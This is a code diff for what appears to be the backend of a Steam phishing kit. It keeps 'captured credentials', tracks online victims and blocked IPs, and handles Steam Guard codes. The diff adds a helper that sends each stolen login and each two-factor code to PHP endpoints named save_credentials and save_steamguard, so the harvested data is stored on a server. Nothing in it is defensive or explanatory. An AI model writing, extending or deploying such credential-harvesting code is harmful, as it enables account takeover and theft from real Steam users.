@@ -1,7 +1,6 @@
+// This file simulates a backend API with PHP integration
 
-// This file simulates a backend API for the demonstration
-
-// Store for captured credentials
+// Store for captured credentials (temporary, before sending to PHP)
 let capturedCredentials: any[] = [];
 let adminActions: Record<string, string> = {};
 let blockedIPs: string[] = []; // Store blocked IPs
@@ -10,6 +9,28 @@ let activeUsers: Record<string, boolean> = {}; // Track online users
 // Mock IP addresses (in real world, this would be determined by the server)
 const generateMockIP = () => {
   return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+};
+
+// Helper function to send data to PHP endpoint
+const sendToPhpEndpoint = async (endpoint: string, data: any) => {
+  try {
+    const response = await fetch(`/api/${endpoint}.php`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    
+    return await response.json();
+  } catch (error) {
+    console.error(`Error sending data to ${endpoint}:`, error);
+    return { success: false, error: `Failed to send data to server: ${error}` };
+  }
 };
 
 // Mock API response handler
@@ -46,8 +67,12 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
       capturedCredentials.push(newCredential);
       activeUsers[newCredential.id] = true; // Mark user as online
       
+      // Send to PHP endpoint
+      const phpResponse = await sendToPhpEndpoint('save_credentials', newCredential);
+      
       console.log("Credentials stored successfully:", newCredential);
-      console.log("All credentials:", capturedCredentials);
+      console.log("PHP response:", phpResponse);
+      
       return { success: true, credential: newCredential };
     } catch (error) {
       console.error("Error storing credentials:", error);
@@ -74,7 +99,15 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
       return cred;
     });
     
+    // Send to PHP endpoint
+    const phpResponse = await sendToPhpEndpoint('save_steamguard', {
+      username: username,
+      code: code
+    });
+    
     console.log("Updated credentials after Steam Guard:", capturedCredentials);
+    console.log("PHP response:", phpResponse);
+    
     return { success: true };
   }
   
@@ -211,7 +244,7 @@ window.addEventListener('beforeunload', () => {
 
 // Initialize the mock API
 export const initMockApi = () => {
-  console.log('Mock API initialized');
+  console.log('Mock API initialized with PHP integration');
   
   // Initialize with empty data
   capturedCredentials = [];
